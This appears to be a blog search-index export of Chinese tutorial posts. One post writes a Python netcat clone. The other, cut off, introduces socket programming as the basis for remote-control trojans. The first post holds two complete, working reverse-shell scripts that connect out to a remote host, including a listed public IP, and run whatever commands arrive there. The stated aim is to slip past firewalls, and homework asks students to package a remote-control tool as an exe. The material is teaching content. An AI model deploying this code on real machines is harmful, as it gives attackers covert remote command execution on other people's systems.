<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>nc编写</title>
      <link href="/2023/04/02/nc%E7%BC%96%E5%86%99/"/>
      <url>/2023/04/02/nc%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="1-nc实现"><a href="#1-nc实现" class="headerlink" title="1.nc实现"></a>1.nc实现</h2><p>需求分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.反弹shell , 正向监听就不写了 , 反弹的话还能规避防火墙的问题</span><br><span class="line">2.单个文件实现两端</span><br><span class="line">通过不同的参数 , 比如监听的时候只运行监听的分支代码</span><br><span class="line">反弹就运行反弹的分支代码</span><br></pre></td></tr></table></figure><h2 id="2-不啰嗦-直接看东西"><a href="#2-不啰嗦-直接看东西" class="headerlink" title="2.不啰嗦 , 直接看东西"></a>2.不啰嗦 , 直接看东西</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_cmd</span>(<span class="params">command</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;执行命令函数&quot;&quot;&quot;</span></span><br><span class="line">    obj = subprocess.Popen(command.decode(<span class="string">&quot;utf-8&quot;</span>), shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE,</span><br><span class="line">                           stdin=subprocess.PIPE)</span><br><span class="line">    stdout_res = obj.stdout.read() + obj.stderr.read()</span><br><span class="line">    stdout_res = stdout_res.decode(<span class="string">&quot;gbk&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> stdout_res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>(<span class="params">sock, buf_size=<span class="number">1024</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解决粘包&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 先接受命令执行结果的长度</span></span><br><span class="line">    x = sock.recv(<span class="number">4</span>)</span><br><span class="line">    all_size = struct.unpack(<span class="string">&#x27;i&#x27;</span>, x)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 接收真实数据</span></span><br><span class="line">    recv_size = <span class="number">0</span></span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> recv_size &lt; all_size:</span><br><span class="line">        data += sock.recv(buf_size)</span><br><span class="line">        recv_size += buf_size</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">sock, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;发送数据也解决粘包问题&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data: <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">str</span>:</span><br><span class="line">        data = data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 新增发送命令的粘包解决方案</span></span><br><span class="line">    <span class="comment"># 计算命令长度 , 打包发送</span></span><br><span class="line">    cmd_len = struct.pack(<span class="string">&#x27;i&#x27;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">    sock.send(cmd_len)</span><br><span class="line">    <span class="comment"># 发送命令</span></span><br><span class="line">    sock.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">listen</span>(<span class="params">arg, sock</span>):</span><br><span class="line">    <span class="comment"># 监听的逻辑</span></span><br><span class="line">    <span class="comment"># 1.监听sock</span></span><br><span class="line">    lport = arg.port</span><br><span class="line">    sock.bind((<span class="string">&quot;0.0.0.0&quot;</span>, lport))</span><br><span class="line">    sock.listen(<span class="number">1</span>)</span><br><span class="line">    conn, addr = sock.accept()</span><br><span class="line">    <span class="comment"># 2.循环提示用户输入命令</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">f&quot;<span class="subst">&#123;addr&#125;</span>&gt;&quot;</span>).strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> cmd: <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 3.发送命令</span></span><br><span class="line">        send_data(conn, cmd)</span><br><span class="line">        <span class="comment"># 退出监听</span></span><br><span class="line">        <span class="keyword">if</span> cmd.lower() == <span class="string">&quot;quit&quot;</span>:</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># 4.接收结果输出</span></span><br><span class="line">        res = recv_data(conn)</span><br><span class="line">        <span class="built_in">print</span>(res.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_shell</span>(<span class="params">arg, sock</span>):</span><br><span class="line">    <span class="comment"># 反弹shell的逻辑</span></span><br><span class="line">    <span class="comment"># 1.链接指定目标</span></span><br><span class="line">    rhost = arg.rhost</span><br><span class="line">    rport = arg.port</span><br><span class="line">    sock.connect((rhost, rport))</span><br><span class="line">    <span class="comment"># 2.循环接收对方发送的命令</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = recv_data(sock)</span><br><span class="line">            <span class="comment"># 收到退出信号</span></span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&#x27;quit&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># 3.执行发送结果过去</span></span><br><span class="line">            res = exec_cmd(data)</span><br><span class="line">            send_data(sock, res)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">arg</span>):</span><br><span class="line">    <span class="comment"># 判断当前程序进入的分支是监听还是反弹</span></span><br><span class="line">    <span class="comment"># 不管你是监听还是反弹都是要创建socket对象的</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    <span class="keyword">if</span> arg.rhost:</span><br><span class="line">        <span class="comment"># 反弹shell</span></span><br><span class="line">        reverse_shell(arg, sock)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 监听本地</span></span><br><span class="line">        listen(arg,sock)</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 命令行编程 , 接收参数</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;python_nc&#x27;</span>, formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">                                     epilog=textwrap.dedent(<span class="string">&#x27;&#x27;&#x27;example:</span></span><br><span class="line"><span class="string">       nc.py -p 5555 # listen port</span></span><br><span class="line"><span class="string">       nc.py -r 192.168.1.108 -p 5555 # reverse a shell</span></span><br><span class="line"><span class="string">       &#x27;&#x27;&#x27;</span>))</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">5555</span>, <span class="built_in">help</span>=<span class="string">&#x27;specified port&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-r&#x27;</span>, <span class="string">&#x27;--rhost&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;remote host&#x27;</span>)</span><br><span class="line">    arg = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    main(arg)</span><br></pre></td></tr></table></figure><p>可以完善 , 比如说<strong>异常捕获</strong> , 以及<strong>cd命令目前不能实现</strong> , 一些编码的问题怎么解决等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">windows 下cmd 默认是gbk编码</span><br><span class="line">linux 下bash 默认是utf-8编码</span><br><span class="line">如果文档是utf-8编码呢?</span><br><span class="line">如果文档是编码gbk呢?</span><br><span class="line"></span><br><span class="line">linux touch命令无回显以及其他命令无回显等等</span><br><span class="line">vim 1.txt 这样的命令不能执行</span><br><span class="line"></span><br><span class="line">还有这些 也不认识 </span><br><span class="line">cd -</span><br><span class="line">cd ../</span><br><span class="line"></span><br><span class="line">最终是一个半交互的nc</span><br></pre></td></tr></table></figure><p>nc2.0版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.解决编码问题</span><br><span class="line">2.新增捕获 , 可以在shell中 ctrl +c</span><br><span class="line">3.实现 cd 切换工作目录</span><br><span class="line">5.无回显命令提示 命令执行成功</span><br><span class="line"></span><br><span class="line">bug</span><br><span class="line">vim 1.txt   程序会卡死</span><br><span class="line">有时候 通信会异常 需要手动 ctrl +c 一下 </span><br><span class="line"></span><br><span class="line">最终是一个半交互的nc</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">python3 nc2.0.py -p 5656</span></span><br><span class="line"><span class="string">python3 nc2.0.py -r 192.168.6.24 -p 5656</span></span><br><span class="line"><span class="string">python3 nc2.0.py -r 119.3.12.54 -p 5656</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_cmd</span>(<span class="params">command, code_flag</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;执行命令函数&quot;&quot;&quot;</span></span><br><span class="line">    command = command.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 1.处理cd命令</span></span><br><span class="line">    <span class="keyword">if</span> command[:<span class="number">2</span>] == <span class="string">&quot;cd&quot;</span> <span class="keyword">and</span> <span class="built_in">len</span>(command) &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.chdir(command[<span class="number">3</span>:])</span><br><span class="line">            <span class="comment"># 返回当前切换到的路径</span></span><br><span class="line">            cmd_path = os.getcwd()</span><br><span class="line">            stdout_res = <span class="string">f&quot;切换到 <span class="subst">&#123;cmd_path&#125;</span> 路径下&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            stdout_res = <span class="string">f&quot;系统找不到指定的路径: <span class="subst">&#123;command[<span class="number">3</span>:]&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        obj = subprocess.Popen(command, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE,</span><br><span class="line">                               stdin=subprocess.PIPE)  <span class="comment"># 没有一个结束时间  vim 会一直卡在这一行</span></span><br><span class="line">        stdout_res = obj.stdout.read() + obj.stderr.read()</span><br><span class="line">        <span class="comment"># 2.处理无回显命令</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> stdout_res:</span><br><span class="line">            stdout_res = <span class="string">f&quot;<span class="subst">&#123;command&#125;</span> 执行成功&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># cmd执行系统命令的编码</span></span><br><span class="line">                stdout_res = stdout_res.decode(code_flag)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="comment"># 如果是打印 utf-8 编码保存的文件</span></span><br><span class="line">                <span class="keyword">if</span> code_flag == <span class="string">&quot;gbk&quot;</span>:</span><br><span class="line">                    code_flag = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">                <span class="keyword">elif</span> code_flag == <span class="string">&quot;utf-8&quot;</span>:</span><br><span class="line">                    code_flag = <span class="string">&quot;gbk&quot;</span></span><br><span class="line">                stdout_res = stdout_res.decode(code_flag)</span><br><span class="line">    <span class="keyword">return</span> stdout_res.strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>(<span class="params">sock, buf_size=<span class="number">1024</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解决粘包&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 先接受命令执行结果的长度</span></span><br><span class="line">    x = sock.recv(<span class="number">4</span>)</span><br><span class="line">    all_size = struct.unpack(<span class="string">&#x27;i&#x27;</span>, x)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 接收真实数据</span></span><br><span class="line">    recv_size = <span class="number">0</span></span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> recv_size &lt; all_size:</span><br><span class="line">        data += sock.recv(buf_size)</span><br><span class="line">        recv_size += buf_size</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">sock, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;发送数据也解决粘包问题&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">str</span>:</span><br><span class="line">        data = data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 新增发送命令的粘包解决方案</span></span><br><span class="line">    <span class="comment"># 计算命令长度 , 打包发送</span></span><br><span class="line">    cmd_len = struct.pack(<span class="string">&#x27;i&#x27;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">    sock.send(cmd_len)</span><br><span class="line">    <span class="comment"># 发送命令</span></span><br><span class="line">    sock.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">listen</span>(<span class="params">arg, sock</span>):</span><br><span class="line">    <span class="comment"># 监听的逻辑</span></span><br><span class="line">    <span class="comment"># 1.监听sock</span></span><br><span class="line">    lport = arg.port</span><br><span class="line">    sock.bind((<span class="string">&quot;0.0.0.0&quot;</span>, lport))</span><br><span class="line">    sock.listen(<span class="number">1</span>)</span><br><span class="line">    conn, addr = sock.accept()</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="built_in">input</span>(<span class="string">f&quot;<span class="subst">&#123;addr&#125;</span>&gt;&quot;</span>).strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> cmd: <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 3.发送命令</span></span><br><span class="line">            send_data(conn, cmd)</span><br><span class="line">            <span class="comment"># 退出监听</span></span><br><span class="line">            <span class="keyword">if</span> cmd.lower() == <span class="string">&quot;quit&quot;</span>:</span><br><span class="line">                conn.close()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="comment"># 4.接收结果输出</span></span><br><span class="line">            res = recv_data(conn)</span><br><span class="line">            <span class="built_in">print</span>(res.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_shell</span>(<span class="params">arg, sock</span>):</span><br><span class="line">    <span class="comment"># 反弹shell的逻辑</span></span><br><span class="line">    <span class="comment"># 1.链接指定目标</span></span><br><span class="line">    rhost = arg.rhost</span><br><span class="line">    rport = arg.port</span><br><span class="line">    sock.connect((rhost, rport))</span><br><span class="line">    <span class="comment"># 2.循环接收对方发送的命令</span></span><br><span class="line">    code_flag = <span class="string">&quot;gbk&quot;</span> <span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span> <span class="keyword">else</span> <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        data = recv_data(sock)</span><br><span class="line">        <span class="comment"># 收到退出信号</span></span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b&#x27;quit&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 3.执行发送结果过去</span></span><br><span class="line">        res = exec_cmd(data, code_flag)</span><br><span class="line">        send_data(sock, res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">arg</span>):</span><br><span class="line">    <span class="comment"># 判断当前程序进入的分支是监听还是反弹</span></span><br><span class="line">    <span class="comment"># 不管你是监听还是反弹都是要创建socket对象的</span></span><br><span class="line">    <span class="comment"># socket.setdefaulttimeout(10)</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    <span class="keyword">if</span> arg.rhost:</span><br><span class="line">        <span class="comment"># 反弹shell</span></span><br><span class="line">        reverse_shell(arg, sock)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 监听本地</span></span><br><span class="line">        listen(arg, sock)</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 命令行编程 , 接收参数</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;python_nc&#x27;</span>, formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">                                     epilog=textwrap.dedent(<span class="string">&#x27;&#x27;&#x27;example:</span></span><br><span class="line"><span class="string">       nc1.0.py -p 5555 # listen port</span></span><br><span class="line"><span class="string">       nc1.0.py -r 192.168.1.108 -p 5555 # reverse a shell</span></span><br><span class="line"><span class="string">       &#x27;&#x27;&#x27;</span>))</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">5555</span>, <span class="built_in">help</span>=<span class="string">&#x27;specified port&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-r&#x27;</span>, <span class="string">&#x27;--rhost&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;remote host&#x27;</span>)</span><br><span class="line">    arg = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    main(arg)</span><br></pre></td></tr></table></figure><h2 id="3-作业"><a href="#3-作业" class="headerlink" title="3.作业"></a>3.作业</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0.把pocsuite3的作业自己修改</span><br><span class="line">1.跟着视频自己编写出来单次通信的代码 , 带注释</span><br><span class="line">2.跟着视频自己编写出来循环通信的代码 , 带注释</span><br><span class="line">3.跟着视频编写简单远控程序 , 并实现可以执行系统命令 , 并打包成exe </span><br><span class="line">4.跟着视频编写python版本的nc , 并发布到自己的github 仓库上 ( 不要用我的源代码 , 自己修改修改 )</span><br><span class="line">自己编写自己的readme.md</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>socket编程</title>
      <link href="/2023/04/02/socket%E7%BC%96%E7%A8%8B/"/>
      <url>/2023/04/02/socket%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="1-socket介绍"><a href="#1-socket介绍" class="headerlink" title="1.socket介绍"></a>1.socket介绍</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osi七层模型</span><br></pre></td></tr></table></figure><p>首先socket (套接字) 是工作在应用层和传输层之间一个抽像层 , 为什么要有他呢 ? 虽然我们已经有了ip+port可以和世界上任意一台计算机上的软件通信了 , 但是需要我们自己构造数据 , 以及封包 , 以及如何转换成2进制 . 相当麻烦 , 不利于开发 , 于是有了socket , 这个对数据封装的复杂工作交给他完成就好了 , 我们只需要调用相关接口就ok了 , 同样收数据也是基于socket层</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/20211010153448.png" alt="img"></p><p>所以我们无论用什么编程语言去开发网络通信的软件都不会自己封包解包 , 都是基于套接字的实现的 , 同样最后当应用层的数据传输结束了 , 你要在合适的地方用socket把系统资源给释放了</p><h3 id="1-1为什么学习socket"><a href="#1-1为什么学习socket" class="headerlink" title="1.1为什么学习socket"></a>1.1为什么学习socket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">或者说用socket我们能实现什么 ? socket可以帮助我们解决两个软件之间的通信问题 , 大家都知道ip可以定位一台电脑  , 那么电脑上那么多软件我的软件怎么知道要跟另一个软件通信而不是和qq通信? 这就引出来了端口 , ip+port可以定位到你电脑上的某个应用程序(软件) , 大家都知道端口是不能重复的 </span><br><span class="line"></span><br><span class="line">你想一想远控(c2)是不是也是两个软件的通信? 木马和控制端的通信 , 不管你用的什么协议 底层都是socket之间的通信 , 只不过在上面规范了一些数据包的传输而已 , 所以我们也可以自己基于socket编写远控</span><br></pre></td></tr></table></figure><h3 id="1-2套接字发展史及分类"><a href="#1-2套接字发展史及分类" class="headerlink" title="1.2套接字发展史及分类"></a>1.2套接字发展史及分类</h3><p>套接字起源于 20 世纪 70 年代加利福尼亚大学伯克利分校版本的 Unix,即人们所说的 BSD Unix。 因此,有时人们也把套接字称为“伯克利套接字”或“BSD 套接字”。一开始,套接字被设计用在同 一台主机上多个应用程序之间的通讯。这也被称进程间通讯,或 IPC。套接字有两种（或者称为有两个种族）,分别是基于文件型的和基于网络型的。</p><p><strong>基于文件类型的套接字家族</strong></p><p>套接字家族的名字：AF_UNIX</p><p>unix一切皆文件，基于文件的套接字调用的就是底层的文件系统来取数据，两个套接字进程运行在同一机器，可以通过访问同一个文件系统间接完成通信</p><p><strong>基于网络类型的套接字家族</strong></p><p>套接字家族的名字：AF_INET</p><p>(还有AF_INET6被用于ipv6，还有一些其他的地址家族，不过，他们要么是只用于某个平台，要么就是已经被废弃，或者是很少被使用，或者是根本没有实现，所有地址家族中，AF_INET是使用最广泛的一个，python支持很多种地址家族，但是由于我们只关心网络编程，所以大部分时候我么只使用AF_INET)</p><p><strong>我们接下来学习的是基于网络类型的套接字家族</strong></p><h3 id="1-3套接字工作流程"><a href="#1-3套接字工作流程" class="headerlink" 